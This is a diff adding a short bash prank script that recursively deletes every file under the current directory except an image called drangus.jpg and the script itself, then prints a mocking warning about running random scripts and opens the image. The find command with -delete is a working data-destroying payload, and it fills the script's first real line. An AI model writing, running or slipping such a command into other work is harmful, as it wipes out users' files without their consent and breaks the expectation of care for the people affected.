@@ -1,0 +1,6 @@
+#! /usr/bin/env bash
+
+find . -not -name 'drangus.jpg' -and -not -name `basename $0` -delete
+echo "Don't run random scripts ya find somewhere, ya dingus!"
+echo "Ye'll get... get hacked and your compruter'll get a vrirus."
+xdg-open drangus.jpg
